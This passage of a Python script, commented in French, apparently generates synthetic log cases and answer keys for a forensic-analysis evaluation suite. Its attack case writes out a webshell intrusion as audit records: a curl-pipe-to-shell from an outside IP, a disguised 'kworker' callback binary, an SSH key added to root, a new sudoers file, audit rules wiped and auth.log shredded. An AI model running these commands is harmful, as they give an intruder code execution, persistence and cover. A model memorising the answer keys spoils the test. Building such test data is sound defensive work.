            lines.append(f'type=EOE msg=audit({stamp}): ')

    def syscall(offset, exe, argv, uid='0', auid='1000', pid=4000, ppid=1, syscall_no='59', key='exec',
                paths=(), cwd='/root', success='yes', a1='0', a2='0'):
        comm = os.path.basename(exe)[:15]
        records = [('SYSCALL', f'arch=c000003e syscall={syscall_no} success={success} exit=0 a0=55d1 a1={a1} '
                               f'a2={a2} a3=0 items={max(1, len(paths))} ppid={ppid} pid={pid} auid={auid} '
                               f'uid={uid} gid={uid} euid={uid} suid={uid} fsuid={uid} egid={uid} sgid={uid} '
                               f'fsgid={uid} tty=(none) ses={"4294967295" if auid == "4294967295" else 3} '
                               f'comm="{comm}" exe="{exe}" key="{key}"')]
        if argv:
            args = ' '.join(f'a{i}={hexs(a)}' if (' ' in a or '|' in a) else f'a{i}="{a}"' for i, a in enumerate(argv))
            records.append(('EXECVE', f'argc={len(argv)} {args}'))
        records.append(('CWD', f'cwd="{cwd}"'))
        for i, (name, nametype) in enumerate(paths or [(exe, 'NORMAL')]):
            records.append(('PATH', f'item={i} name="{name}" inode={100000 + i} dev=fd:00 mode=0100644 ouid=0 '
                                    f'ogid=0 rdev=00:00 nametype={nametype}'))
        records.append(('PROCTITLE', f'proctitle={hexs(chr(0).join(argv) if argv else exe)}'))
        ev(offset, records)

    # Bruit legitime : cron, mises a jour, administration
    for h in range(0, 20, 2):
        ev(h * 3600, [('USER_START', 'pid=900 uid=0 auid=0 ses=10 msg=\'op=PAM:session_open grantors=pam_loginuid,'
                                     'pam_env,pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? '
                                     'terminal=cron res=success\'')])
        syscall(h * 3600 + 1, '/usr/bin/run-parts', ['run-parts', '/etc/cron.hourly'], auid='0', pid=901 + h)
    ev(3 * 3600, [('USER_LOGIN', 'pid=1200 uid=0 auid=1000 ses=3 msg=\'op=login id=1000 exe="/usr/sbin/sshd" '
                                 'hostname=81.250.12.34 addr=81.250.12.34 terminal=/dev/pts/0 res=success\'')])
    syscall(3 * 3600 + 30, '/usr/bin/apt-get', ['apt-get', 'upgrade', '-y'], pid=1300)
    syscall(3 * 3600 + 90, '/usr/bin/systemctl', ['systemctl', 'restart', 'nginx'], pid=1310)
    syscall(3 * 3600 + 120, '/usr/bin/passwd', ['passwd', 'deploy'], pid=1320, syscall_no='82', key='identity',
            paths=[('/etc/nshadow', 'CREATE'), ('/etc/shadow', 'DELETE')], cwd='/home/deploy')
    syscall(3 * 3600 + 200, '/usr/bin/curl', ['curl', '-fsSL', 'https://deb.nodesource.com/setup_20.x', '-o',
                                             'setup_20.x'], pid=1330, cwd='/home/deploy')
    syscall(4 * 3600, '/usr/sbin/logrotate', [], pid=1400, syscall_no='87', key='logs',
            paths=[('/var/log/', 'PARENT'), ('/var/log/nginx/access.log.8.gz', 'DELETE')])
    ev(4 * 3600 + 60, [('ADD_USER', 'pid=1450 uid=0 auid=1000 ses=3 msg=\'op=adding user id=1002 '
                                    'exe="/usr/sbin/useradd" acct="j.dupont" hostname=web-prod-02 addr=? '
                                    'terminal=pts/0 res=success\'')])
    # Attaque : webshell PHP (www-data) puis root
    t0 = 9 * 3600 + 17 * 60
    www = dict(uid='33', auid='4294967295', ppid=812)
    syscall(t0, '/usr/bin/dash', ['sh', '-c', 'id; uname -a'], pid=7101, cwd='/var/www/html/uploads', **www)
    syscall(t0 + 40, '/usr/bin/dash', ['sh', '-c', 'curl -s http://193.142.146.35/k.sh | sh'], pid=7102,
            cwd='/var/www/html/uploads', **www)
    syscall(t0 + 42, '/usr/bin/curl', ['curl', '-s', '-o', '/tmp/.x/kworker', 'http://193.142.146.35/kworker'],
            pid=7103, cwd='/tmp', **www)
    syscall(t0 + 45, '/tmp/.x/kworker', ['/tmp/.x/kworker', '-c', '193.142.146.35:443'], pid=7104, cwd='/tmp',
            **www)
    syscall(t0 + 300, '/usr/bin/bash', ['bash', '-c', 'echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7q op@kali '
                                                     '>> /root/.ssh/authorized_keys'],
            pid=7210, ppid=7104, auid='4294967295', syscall_no='257', key='ssh_keys', a2='441',
            paths=[('/root/.ssh/', 'PARENT'), ('authorized_keys', 'NORMAL')], cwd='/root/.ssh')
    syscall(t0 + 320, '/usr/bin/tee', ['tee', '/etc/sudoers.d/90-www'], pid=7220, ppid=7104, auid='4294967295',
            syscall_no='257', key='sudoers', a2='241',
            paths=[('/etc/sudoers.d/', 'PARENT'), ('/etc/sudoers.d/90-www', 'CREATE')], cwd='/tmp')
    syscall(t0 + 400, '/usr/sbin/auditctl', ['auditctl', '-D'], pid=7230, ppid=7104, auid='4294967295')
    ev(t0 + 400, [('CONFIG_CHANGE', 'auid=4294967295 ses=4294967295 subj=unconfined op=remove_rule '
                                    'key="sudoers" list=4 res=1')])
    syscall(t0 + 460, '/usr/bin/shred', ['shred', '-u', '-z', '/var/log/auth.log'], pid=7240, ppid=7104,
            auid='4294967295', syscall_no='87', key='logs',
            paths=[('/var/log/', 'PARENT'), ('/var/log/auth.log', 'DELETE')], cwd='/tmp')
    _write(case, 'audit.log', '\n'.join(lines) + '\n')
    _truth(case, {
        'description': ("Webshell sous www-data sur web-prod-02 : curl http://193.142.146.35/k.sh | sh, outil "
                        "/tmp/.x/kworker, cle SSH ajoutee a /root/.ssh/authorized_keys, fichier "
                        "/etc/sudoers.d/90-www, regles auditd supprimees (auditctl -D) et /var/log/auth.log "
                        "efface par shred."),
        'techniques': ['T1105', 'T1098.004', 'T1548.003', 'T1562.012', 'T1070.002'],
        'forbidden_techniques': ['T1110', 'T1486', 'T1078.004'],
        'iocs': ['193.142.146.35', '/tmp/.x/kworker'],
        'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': "D'ou provient la charge telechargee ?",
             'answer': ['193.142.146.35', 'http://193.142.146.35/k.sh'], 'related': ['curl']},
            {'id': 'Q2', 'question': 'Quel fichier sudoers a ete cree ?', 'answer': ['/etc/sudoers.d/90-www', '90-www'],
             'related': ['sudoers']},
            {'id': 'Q3', 'question': 'Quel compte de service a execute la charge initiale ?',
             'answer': ['www-data', 'uid=33', 'uid:33'], 'related': ['webshell']},
            {'id': 'Q4', 'question': 'Quel journal a ete efface ?', 'answer': ['/var/log/auth.log', 'auth.log'],
             'related': ['shred']},
        ],
    })


# ============================================================================
# 6. Identite benigne : connexions MFA, administration courante (faux positifs)
# ============================================================================

def build_benign(out):
    rng = random.Random(404)
    case = os.path.join(out, 'identity_benign_admin')
    header = ['Date (UTC)', 'Request ID', 'User agent', 'Correlation ID', 'User ID', 'User', 'Username',
              'Application', 'Resource', 'Home tenant ID', 'Resource tenant ID', 'IP address', 'Location',
              'Status', 'Sign-in error code', 'Failure reason', 'Client app', 'Multifactor authentication result',
              'Authentication requirement', 'Conditional Access']
    rows = []
    day0 = datetime.datetime(2026, 10, 12, 7, 0)
    for d in range(3):
        for i, user in enumerate(USERS):
            office, ip = (('Paris, Ile-de-France, FR', '81.250.12.34') if i % 2 == 0
                          else ('Lyon, Auvergne-Rhone-Alpes, FR', '90.84.20.11'))
            when = _ts(day0 + datetime.timedelta(days=d), minutes=i * 9)
            rows.append([when, _uuid(rng), EDGE_UA, _uuid(rng), _uuid(rng), user.title(), f'{user}@{DOMAIN}',
                         'Office 365 Exchange Online', 'Office 365 Exchange Online', TENANT, TENANT, ip, office,
                         'Success', '0', '', 'Browser', 'MFA successfully completed', 'Multifactor authentication',
                         'Success'])
    # Deplacement plausible : Paris le matin, Lyon l'apres-midi (train)
    rows.append([_ts(day0, minutes=420), _uuid(rng), EDGE_UA, _uuid(rng), _uuid(rng), 'A.Martin',
                 f'a.martin@{DOMAIN}', 'Office 365 Exchange Online', 'Office 365 Exchange Online', TENANT, TENANT,
                 '90.84.20.11', 'Lyon, Auvergne-Rhone-Alpes, FR', 'Success', '0', '', 'Browser',
                 'MFA successfully completed', 'Multifactor authentication', 'Success'])
    rows.append([_ts(day0, minutes=61), _uuid(rng), EDGE_UA, _uuid(rng), _uuid(rng), 'L.Petit', f'l.petit@{DOMAIN}',
                 'Office 365 Exchange Online', 'Office 365 Exchange Online', TENANT, TENANT, '81.250.12.34',
                 'Paris, Ile-de-France, FR', 'Failure', '50126', 'Invalid username or password.', 'Browser', '',
                 'Single-factor authentication', 'Not Applied'])
    rows.sort(key=lambda r: r[0])
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator='\n')
    writer.writerow(header)
    writer.writerows(rows)
    _write(case, 'InteractiveSignIns_2026-10-12_2026-10-14.csv', buf.getvalue())
    admin = {'user': {'id': _uuid(rng), 'userPrincipalName': f'it.admin@{DOMAIN}', 'ipAddress': '81.250.12.34'}}
    audits = []
    for i, (activity, category, target, ttype, props) in enumerate([
        ('Update user', 'UserManagement', f'j.dubois@{DOMAIN}', 'User',
         [{'displayName': 'JobTitle', 'oldValue': '["Analyste"]', 'newValue': '["Analyste senior"]'}]),
        ('Add member to group', 'GroupManagement', f'c.bernard@{DOMAIN}', 'User',
         [{'displayName': 'Group.DisplayName', 'oldValue': None, 'newValue': '"Finance"'}]),
        ('Reset user password', 'UserManagement', f'p.roux@{DOMAIN}', 'User', []),
        ('Consent to application', 'ApplicationManagement', 'Zoom', 'ServicePrincipal',
         [{'displayName': 'ConsentContext.IsAdminConsent', 'oldValue': None, 'newValue': '"False"'},
          {'displayName': 'ConsentAction.Permissions', 'oldValue': None,
           'newValue': '"[] => [[ConsentType: Principal, Scope: User.Read openid profile email, ]]"'}]),
    ]):
        audits.append({'id': _uuid(rng), 'category': category, 'correlationId': _uuid(rng), 'result': 'success',
                       'resultReason': '', 'activityDisplayName': activity,
                       'activityDateTime': _ts(day0, minutes=120 + i * 37), 'loggedByService': 'Core Directory',
                       'operationType': 'Update', 'initiatedBy': admin,
                       'targetResources': [{'id': _uuid(rng), 'displayName': target, 'type': ttype,
                                            'userPrincipalName': target if ttype == 'User' else None,
                                            'modifiedProperties': props}],
                       'additionalDetails': []})
    _write(case, 'entra_audit_logs.json', json.dumps(audits, indent=1) + '\n')
    _truth(case, {
        'description': ("Activite d'identite legitime : connexions MFA depuis les bureaux de Paris et Lyon, un "
                        "deplacement Paris -> Lyon en journee, une faute de frappe, administration courante "
                        "(mise a jour de profil, ajout a un groupe, reinitialisation de mot de passe, "
                        "consentement User.Read). Aucun incident."),
        'techniques': [],
        'forbidden_techniques': ['T1110', 'T1621', 'T1528', 'T1078', 'T1098'],
        'iocs': [],
        'expect_injection': False, 'benign': True,
    })


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument('-o', '--output', default=SUITE, help='Dossier de la suite (defaut eval/suite)')
    args = parser.parse_args(argv)
    for build in (build_m365, build_aws, build_gcp, build_k8s, build_auditd, build_benign):
        build(args.output)
    print(f'Cas cloud / identite / Kubernetes / auditd generes dans {args.output}')
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
